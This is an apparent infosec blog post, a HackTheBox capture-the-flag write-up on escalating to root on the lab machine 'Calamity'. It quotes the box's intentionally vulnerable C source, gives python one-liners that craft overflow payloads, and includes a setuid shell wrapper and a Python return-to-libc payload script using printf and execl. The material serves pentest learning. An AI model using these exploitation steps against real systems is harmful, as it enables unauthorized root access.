@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="generator" content="Hugo 0.33" />
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>HackTheBox: Calamity Privilege Escalation &middot; Charix&#39;s Infosec Blog</title>
+
+  
+  <link rel="stylesheet" href="/css/print.css" media="print">
+  <link rel="stylesheet" href="/css/poole.css">
+  <link rel="stylesheet" href="/css/syntax.css">
+  <link rel="stylesheet" href="/css/hyde.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface|PT+Sans:400,400i,700">
+
+  
+  <link rel="shortcut icon" href="/favicon.png">
+
+  
+  <link href="" rel="alternate" type="application/rss+xml" title="Charix&#39;s Infosec Blog" />
+</head>
+
+  <body class=" ">
+  <div class="sidebar">
+  <div class="container">
+    <div class="sidebar-about">
+      <a href="/"><h1>Charix&#39;s Infosec Blog</h1></a>
+      <p class="lead">
+      
+      </p>
+    </div>
+
+    <ul class="sidebar-nav">
+      <li><a href="/post/about">About</a> </li>
+    </ul>
+
+    <p>&copy; 2018. All rights reserved. </p>
+  </div>
+</div>
+
+    <div class="content container">
+    <div class="post">
+  <h1>HackTheBox: Calamity Privilege Escalation</h1>
+  <span class="post-date">Fri, Jan 19, 2018</span>
+  
+
+<p><a href="https://www.hackthebox.eu/">HackTheBox</a> is a service that offers a lab environment of vulnerable machines for people interesting in pentesting.</p>
+
+<p>Today I will cover the escalation of privileges from user to root on the retired machine <code>Calamity</code>.</p>
+
+<h1 id="debugging-and-analyzing-the-application">Debugging and Analyzing the Application</h1>
+
+<p>Upon logging onto the machine we are presented with an application and its source-code.</p>
+
+<p><img src="/calamity/Setuid_and_src.PNG" alt="Setuid binary and source" /></p>
+
+<p>Before we analyze the binary, let&rsquo;s have a look at what sort of protections we are dealing with.</p>
+
+<p>ASLR is turned off on the box, so we will not have to deal with that.</p>
+
+<p><img src="/calamity/ASLR.PNG" alt="ASLR" /></p>
+
+<p>Fortunately, the creator of the box has installed <a href="https://github.com/longld/peda">gdb-peda</a> for us to help out with the exploitation.</p>
+
+<p>To check protections we use the <code>checksec</code> command in gdb-peda</p>
+
+<p><img src="/calamity/Checksec.PNG" alt="Checksec" /></p>
+
+<p>As we can see NX (Non-eXecutable) / DEP (Data Execution Prevention) is enabled on this binary which means we will not be able to execute shellcode put directly on the stack. Luckily there is a technique often used to get around this protection which is called ROP (Return-Oriented Programming). More on this later.</p>
+
+<p>Running the application first prompts us for a filename, then shows a menu of options.</p>
+
+<p><img src="/calamity/Menu.PNG" alt="Menu" /></p>
+
+<p>To exploit this program we need to run the <code>debug()</code> function which in the source is easily identified to be vulnerable (it even self-identifies as such&hellip;)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">debug</span>() {
+
+  printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">this function is problematic on purpose</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+  printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">I&#39;m trying to test some things...and that means get control of the program! </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+
+  <span style="color:#66d9ef">char</span> vuln[<span style="color:#ae81ff">64</span>];
+
+  printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;vulnerable pointer is at %x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, vuln);
+  printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;memory information on this binary:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, vuln);
+
+  printmaps();
+
+  printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Filename:  &#34;</span>);
+
+  <span style="color:#66d9ef">char</span> fn[<span style="color:#ae81ff">30</span>];
+  scanf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34; %28s&#34;</span>, <span style="color:#f92672">&amp;</span> fn);
+  flushit();
+  copy(fn,vuln,<span style="color:#ae81ff">100</span>);<span style="color:#75715e">//this shall trigger a buffer overflow
+</span><span style="color:#75715e"></span>
+  <span style="color:#66d9ef">return</span>;
+
+}</code></pre></div>
+<p>To call this function however, we need to pass a check that is executed when we try to &ldquo;login as admin&rdquo;.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (action <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;3&#39;</span>) {
+      attempt_login(hey.admin, protect, hey.secret);
+    }</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">attempt_login</span>(<span style="color:#66d9ef">int</span> shouldbezero, <span style="color:#66d9ef">int</span> safety1, <span style="color:#66d9ef">int</span> safety2) {
+
+  <span style="color:#66d9ef">if</span> (safety2 <span style="color:#f92672">!=</span> safety1) {
+    printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;hackeeerrrr&#34;</span>);
+    fflush(stdout);
+	exit(<span style="color:#ae81ff">666</span>);
+  }
+  <span style="color:#66d9ef">if</span> (shouldbezero <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+    printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">access denied!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    fflush(stdout);
+  } <span style="color:#66d9ef">else</span> debug();
+}</code></pre></div>
+<p>The three values <code>hey.admin</code>, <code>protect</code> and <code>hey.secret</code> are initialized at the start of the program.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">struct</span> timeval tv;
+gettimeofday( <span style="color:#f92672">&amp;</span> tv, NULL);
+
+<span style="color:#66d9ef">int</span> whoopsie<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+<span style="color:#66d9ef">int</span> protect <span style="color:#f92672">=</span> tv.tv_usec <span style="color:#f92672">|</span><span style="color:#ae81ff">0x01010101</span>;<span style="color:#75715e">//I hate null bytes...still secure !
+</span><span style="color:#75715e"></span>
+hey.secret <span style="color:#f92672">=</span> protect;
+hey.session <span style="color:#f92672">=</span> sess;
+hey.admin <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;</code></pre></div>
+<p>The <code>hey.secret</code> value is set to a time-generated value <code>protect</code> and <code>hey.admin</code> to 0.</p>
+
+<p>To identify the initial important vulnerability in this program we have to look at the <code>createusername()</code> function. This function is meant to edit the user variable in the <code>hey</code> struct but has some unfortunate side-effects.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">struct</span> f {
+    <span style="color:#66d9ef">char</span> user[USIZE];
+    <span style="color:#75715e">//int user;
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> secret;
+    <span style="color:#66d9ef">int</span> admin;
+    <span style="color:#66d9ef">int</span> session;
+  }
+hey;</code></pre></div>
+<p>The issue with this function is that it copies a 12 byte value into a 4 byte array. <code>copy()</code> reads X bytes from a file into the location of a pointer. This is a classic buffer overflow.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#define USIZE 12
+</span><span style="color:#75715e">#define ISIZE 4
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">createusername</span>() {
+<span style="color:#75715e">//I think  something&#39;s bad here
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> for_user[ISIZE];
+
+  printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Filename:  &#34;</span>);
+
+  <span style="color:#66d9ef">char</span> fn[<span style="color:#ae81ff">30</span>];
+  scanf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34; %28s&#34;</span>, <span style="color:#f92672">&amp;</span> fn);
+
+flushit();
+  copy(fn, for_user,USIZE);
+
+
+ strncpy(hey.user,for_user,ISIZE<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);
+  hey.user[ISIZE<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+
+}</code></pre></div>
+<p>Let&rsquo;s send a string of 12 A&rsquo;s to the createusername() function and watch the <code>hey</code> struct in memory.</p>
+
+<p><img src="/calamity/BOF1.PNG" alt="BOF" /></p>
+
+<p><img src="/calamity/Stack1.PNG" alt="Stack1" /></p>
+
+<p>It seems we have overwritten the first 5 bytes of the <code>hey</code> struct with A&rsquo;s (0x41) and have caused a segmentation fault. The crash happens because the <code>attempt_login()</code> function is trying to resolve the location of the <code>hey</code> struct in memory but we have also overwritten <code>EBX</code> with 0x41414141. As seen below the location of <code>hey</code> in memory is calculated as <code>EBX + 0x68</code>.</p>
+
+<p><img src="/calamity/EBX.PNG" alt="EBX" /></p>
+
+<h1 id="getting-code-execution">Getting Code Execution</h1>
+
+<p>We now know that in theory if we could overwrite the location of the <code>hey</code> struct passed to <code>attempt_login()</code> we could pass it the location of <code>hey.user</code> which would contain our 4 A&rsquo;s immediately followed by another A. In <code>attempt_login()</code> the <code>protect</code> variable is checked against the integer stored at <code>hey+0xC</code> and it is ensured that the <code>admin</code> variable at <code>hey+0x10</code> is 0.</p>
+
+<p>What if we could change the location that was looked up in memory to make the program check against the user-supplied input instead? The only problem with this is that we would need to know the value of <code>protect</code> in advance.</p>
+
+<p>Luckily, the program has another functionality that prints the <code>user.session</code> variable. By overwriting the location that it looks up we can have this function print the time-generated <code>user.secret</code> variable instead. After this is printed we can again overwrite the location but this time we will set the user-supplied input to the timestamp and a non-0 byte.</p>
+
+<p>To print the secret value, we need to subtract 8 bytes from the location of the <code>hey</code> struct since the two variables are 8 bytes apart. We also subtract 0x68 since that is the relative offset added onto <code>EBX</code>.</p>
+
+<p>Value = 0x80003068 - 0x8 - 0x68 = 0x80002ff8</p>
+
+<p><code>python -c 'print &quot;A&quot;*8 + &quot;\xf8\x2f\x00\x80&quot;' &gt; /tmp/printsecret</code></p>
+
+<p>If we pass this file to <code>createusername()</code> and print the session ID, it will instead print the <code>protect</code> variable.</p>
+
+<p><img src="/calamity/Leak.PNG" alt="Leak" /></p>
+
+<p>And to confirm that it has indeed leaked the protect value.</p>
+
+<p><img src="/calamity/Protect.PNG" alt="Protect" /></p>
+
+<p>Now the only thing left to do is to again overwrite the location to be read from, this time we will overwrite it so the value of <code>hey.secret</code> and <code>hey.admin</code> will instead become our user-supplied buffer. This location is found by subtracting 12 bytes from the location of the <code>hey</code> struct since the secret is located at <code>hey+0xC</code> and our &ldquo;user-supplied secret&rdquo; is at <code>hey+0x0</code>.</p>
+
+<p>Value = 0x80003068 - 0xC - 0x68 = 0x80002ff4</p>
+
+<p><code>python -c 'print &quot;&lt;LEAKED ADDRESS&gt; + &quot;A&quot;*4 + &quot;\xf4\x2f\00\x80&quot;' &gt; /tmp/printdebug</code></p>
+
+<p>Once the value of <code>hey.secret</code> is the correct time-generated value, and the value of <code>hey.admin</code> is not 0 we can &ldquo;login as admin&rdquo;.</p>
+
+<p><img src="/calamity/Setup.PNG" alt="TheSetup" /></p>
+
+<p><img src="/calamity/Admin.PNG" alt="Admin" /></p>
+
+<p>Now we have finally entered the vulnerable <code>debug()</code> as seen earlier. All we have to do now is send it a buffer and determine at exactly what offset the EIP is overwritten. To do this we can use a cyclic pattern created by <a href="https://www.metasploit.com/">Metasploits</a> <code>pattern_create.rb</code> and use this as input to the vulnerable function. Sure enough the program crashes at <code>0x63413563</code> which is offset 76 in the cyclic pattern.</p>
+
+<p><img src="/calamity/Crash.PNG" alt="Crash" /></p>
+
+<p>We now have code execution!</p>
+
+<h1 id="ropping-our-way-to-victory">Ropping our way to victory</h1>
+
+<p>The idea behind ROP is to use snippets of code of code already present in the binary or loaded modules. These snippets of code are referred to as <em>gadgets</em>. The trick and the reason the technique is called <strong>Return</strong>-Oriented Programming is that each of the gadgets will end in a <em>ret</em> instruction. This allows us to chain gadgets together to form valid calls to functions with the correct parameters. Often functions such as system() or execl() from the libc library can be used to spawn a shell if called with the right parameters.</p>
+
+<p>This blogpost won&rsquo;t go into great detail on ROP, but I can recommend the website <a href="https://ropemporium.com/">RopEmporium</a> if you are interested in learning more.</p>
+
+<p>Since the binary is a setuid binary we cannot use  <code>system(&quot;/bin/sh&quot;)</code> to spawn a root shell. This is because setuid and setgid does not work properly with system(), from the manpage: <em>&ldquo;system() will not, in fact, work properly from programs with set-user-ID or set-group-ID privileges on systems on which /bin/sh is bash version 2&rdquo;</em>. For this reason we need to use <code>execl()</code> instead. To simplify our life we will create a wrapper C program containing the following.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">main() {
+    setuid(<span style="color:#ae81ff">0</span>);
+    execl(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#ae81ff">0</span>);
+}</code></pre></div>
+<p>Our mission is to have the program execute <code>execl(&quot;/tmp/wrapper, &quot;/tmp/wrapper&quot;, 0)</code>.
+One apparent issue is that we need to pass a nullbyte as the third parameter to <code>execl()</code>. To do this we will use a nifty feature of the <code>printf()</code> function. If we pass the value <code>%3$n</code> it will overwrite the 3rd argument with the amount of bytes written, which in our case will be 0.</p>
+
+<p>Our buffer will therefore look like this.</p>
+
+<p><code>A*76 | printf() | execl() | pointer to &quot;%3$n&quot; | pointer to &quot;/tmp/wrapper&quot; | pointer to &quot;/tmp/wrapper&quot; | pointer to Nullbyte</code></p>
+
+<p><code>printf()</code> will execute and print a nullbyte to the third argument of printf which is the last part of our buffer &ldquo;<em>pointer to Nullbyte</em>&rdquo;. This pointer has to point to the location on the stack that the third argument of <code>execl()</code> resides at. <code>buffer address + 76 + (4*5)</code> (padding + 5 addresses of 4 bytes each). Again we&rsquo;ve been helped along by the creator of the box, since we are given the buffer address once <code>debug()</code> executes. If this weren&rsquo;t the case it might have been possible to recompile the program on the target machine adding a <code>printf()</code> to print out the address of the buffer. After <code>printf()</code> finishes, it will <strong>return</strong> to <code>execl()</code> and execute our shell.</p>
+
+<p>We will be getting the addresses of the functions by using <code>gdb-peda</code>&rsquo;s <code>print</code>.</p>
+
+<p>The only thing missing is getting pointers to the strings we need, <em>&rdquo;%3$n&rdquo;</em> and <em>&rdquo;/tmp/wrapper&rdquo;</em>. For this we will use the environmental variables as they are always located on the stack. I will be making use of <a href="https://github.com/hellman/fixenv">Fixenv</a> which is a script to ensure that stack addresses are the same whether you&rsquo;re running the binary with or without a debugger. This is helpful since gdb adds its own environmental variables and the addresses will be wrong once we run the exploit outside the debug environment. It can also be used to get the addresses of env variables. Let&rsquo;s get started and resolve the addresses we need.</p>
+
+<p><img src="/calamity/Addresses.PNG" alt="Addresses" /></p>
+
+<p>Once all the addresses are acquired, we write the buffer to a payload. We could do this in a one-liner as seen earlier but for readability here is a python script that makes it easier to understand.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#f92672">import</span> struct<span style="color:#f92672">,</span> sys
+<span style="color:#75715e"># ENVVAR fmt = &#34;%3$n&#34;</span>
+<span style="color:#75715e"># ENVVAR wrapper = /tmp/wrapper</span>
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">76</span>
+
+payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#ae81ff">0xb7e63670</span>) <span style="color:#75715e"># Address of printf</span>
+payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#ae81ff">0xb7ecaa80</span>) <span style="color:#75715e"># Address of execl</span>
+payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#ae81ff">0xbffffea1</span>) <span style="color:#75715e"># Address of env fmt</span>
+payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#ae81ff">0xbfffff9f</span>) <span style="color:#75715e"># Address of env wrapper</span>
+payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#ae81ff">0xbfffff9f</span>) <span style="color:#75715e"># Address of env wrapper</span>
+payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#ae81ff">0xbffff640</span>) <span style="color:#75715e"># Address of arg3 (address of buffer (output by program) + 76 + (4*5))</span>
+
+sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(payload)</code></pre></div>
+<p>Now all there is left to do is run the program, leak the time-generated value. Overwrite the necessary values to enter the debug function. Once here specify the payload.</p>
+
+<p>And sure enough, what we&rsquo;ve all been waiting for&hellip;
+<img src="/calamity/Root.PNG" alt="Root" /></p>
+
+<p>Fancy asciinema below.
+<a href="https://asciinema.org/a/Z2KbX8DJjh9irxwao0aIjjTVi"><img src="https://asciinema.org/a/Z2KbX8DJjh9irxwao0aIjjTVi.png" alt="asciicast" /></a></p>
+
+</div>
+
+
+    </div>
+
+    
+  </body>
+</html>
